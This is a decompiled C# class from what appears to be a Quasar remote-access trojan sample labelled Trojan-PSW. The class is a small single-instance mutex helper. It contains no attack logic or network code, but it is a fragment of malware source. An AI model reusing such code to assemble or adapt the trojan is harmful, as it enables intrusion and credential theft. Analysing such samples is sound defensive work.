// Decompiled with JetBrains decompiler
// Type: Quasar.Client.Utilities.SingleInstanceMutex
// Assembly: Client, Version=1.4.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 73C3C7FC-0EA2-48C4-8CEF-33A8CFDA287C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-PSW.MSIL.Agent.anew-0b84e664c8b592aa0220d52841629b2accb41f1f624720331000ab5f2f0ed628.exe

using System;
using System.Threading;

namespace Quasar.Client.Utilities
{
  public class SingleInstanceMutex : IDisposable
  {
    private readonly Mutex _appMutex;

    public bool CreatedNew { get; }

    public bool IsDisposed { get; private set; }

    public SingleInstanceMutex(string name)
    {
      bool createdNew;
      this._appMutex = new Mutex(false, "Local\\" + name, out createdNew);
      this.CreatedNew = createdNew;
    }

    public void Dispose()
    {
      this.Dispose(true);
      GC.SuppressFinalize((object) this);
    }

    protected virtual void Dispose(bool disposing)
    {
      if (this.IsDisposed)
        return;
      if (disposing)
        this._appMutex?.Dispose();
      this.IsDisposed = true;
    }
  }
}
